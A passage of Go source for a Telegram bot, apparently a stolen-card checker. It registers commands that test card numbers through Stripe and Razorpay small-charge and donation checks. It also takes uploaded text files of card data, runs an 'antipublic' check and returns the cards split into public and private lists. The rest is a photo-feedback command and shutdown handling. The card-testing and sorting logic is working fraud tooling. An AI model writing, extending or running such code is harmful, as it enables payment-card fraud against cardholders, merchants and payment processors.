	registerStripeInline(bot, "/mstr2", "Stripe UHQ $5", um, checkStripeSecondStorkCard)
	registerStripeFile(bot, "/mstr2txt", "Stripe UHQ $5", um, checkStripeSecondStorkCard)
	registerStripeInline(bot, "/str4", "Stripe Donation", um, checkStripeDonationCard)
	registerStripeInline(bot, "/mstr4", "Stripe Donation", um, checkStripeDonationCard)
	registerStripeFile(bot, "/mstr4txt", "Stripe Donation", um, checkStripeDonationCard)
	registerStripeInline(bot, "/str5", "Stripe $1", um, checkStripeDollarCard)
	registerStripeInline(bot, "/mstr5", "Stripe $1", um, checkStripeDollarCard)
	registerStripeFile(bot, "/mstr5txt", "Stripe $1", um, checkStripeDollarCard)

	registerStripeInline(bot, "/raz", "Razorpay", um, checkRazorpayCard)
	registerStripeInline(bot, "/mraz", "Razorpay", um, checkRazorpayCard)
	registerStripeFile(bot, "/mraztxt", "Razorpay", um, checkRazorpayCard)



	bot.Handle("/f", func(c tele.Context) error {
		msg := c.Message()
		var photo *tele.Photo
		if msg.Photo != nil {
			photo = msg.Photo
		} else if msg.ReplyTo != nil && msg.ReplyTo.Photo != nil {
			photo = msg.ReplyTo.Photo
		}
		if photo == nil {
			return c.Send(" Reply to a photo with /f to pin it as feedback.")
		}
		caption := "??????????????????????\n" +
			em("5386757680679377085", "\xe2\xad\x90") + " <b>Feedback Received</b> " + em("5386757680679377085", "\xe2\xad\x90") + "\n" +
			"??????????????????????\n" +
			em("6100546649312987047", "\xf0\x9f\x91\xa4") + " From: @" + html.EscapeString(c.Sender().Username) + "\n" +
			"??????????????????????"
		p := &tele.Photo{File: photo.File, Caption: caption}
		for _, adminID := range allAdminIDs() {
			bot.Send(tele.ChatID(adminID), p, tele.ModeHTML)
		}
		return c.Send(em("5386757680679377085", "\xe2\xad\x90") + " Feedback sent to admins!", tele.ModeHTML)
	})

	bot.Handle(tele.OnDocument, func(c tele.Context) error {
		msg := c.Message()
		if msg.Document == nil {
			return nil
		}
		doc := msg.Document
		if !strings.HasSuffix(strings.ToLower(doc.FileName), ".txt") {
			return nil
		}
		rc, err := bot.File(&doc.File)
		if err != nil {
			return nil
		}
		data, err := io.ReadAll(rc)
		rc.Close()
		if err != nil || len(data) == 0 {
			return nil
		}
		if len(parseCardsFromText(string(data))) == 0 {
			return nil
		}
		if !qualityCheck {
			go antipublicCheck(data, doc.FileName)
			return nil
		}

		prog, _ := bot.Send(c.Chat(), em(emojiSearch, "\xf0\x9f\x94\x8d")+" Checking...", tele.ModeHTML)

		go func() {
			result, err := antipublicCheck(data, doc.FileName)
			if err != nil {
				if qualityCheck {
					bot.Edit(prog, em(emojiCross, "\xe2\x9c\x85")+" "+err.Error(), tele.ModeHTML)
				}
				return
			}
			if !qualityCheck {
				return
			}
			bot.Edit(prog, em(emojiCheck, "\xe2\x9c\x85")+" Check completed", tele.ModeHTML)
			if result.StatsText != "" {
				bot.Send(c.Chat(), strings.ReplaceAll(result.StatsText, "**", ""), tele.ModeDefault)
			} else {
				total := result.PublicCount + result.PrivateCount
				pct := "0%"
				if total > 0 {
					pct = fmt.Sprintf("%.2f%%", float64(result.PrivateCount)/float64(total)*100)
				}
				bot.Send(c.Chat(), fmt.Sprintf(em(emojiCheck, "\xe2\x9c\x85")+" Check results:\nTotal cards: %d\nPrivate: %d  Public: %d\nPrivate percentage: %s", total, result.PrivateCount, result.PublicCount, pct), tele.ModeHTML)
			}
			if len(result.Public) > 0 {
				bot.Send(c.Chat(), &tele.Document{
					File:     tele.FromReader(bytes.NewReader([]byte(result.Public))),
					FileName: "public.txt",
				})
			}
			if len(result.Private) > 0 {
				bot.Send(c.Chat(), &tele.Document{
					File:     tele.FromReader(bytes.NewReader([]byte(result.Private))),
					FileName: "private.txt",
				})
			}
		}()
		return nil
	})

	fmt.Println("Bot started")
	go func() {
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		sig := <-sigCh
		fmt.Printf("[SHUTDOWN] received signal: %v\n", sig)
		fmt.Println("[SHUTDOWN] saving state...")
		um.Save()
		cfg.Save()
		km.Save()
		saveSiteScores()
		fmt.Println("[SHUTDOWN] done")
		os.Exit(0)
	}()
	bot.Start()
}
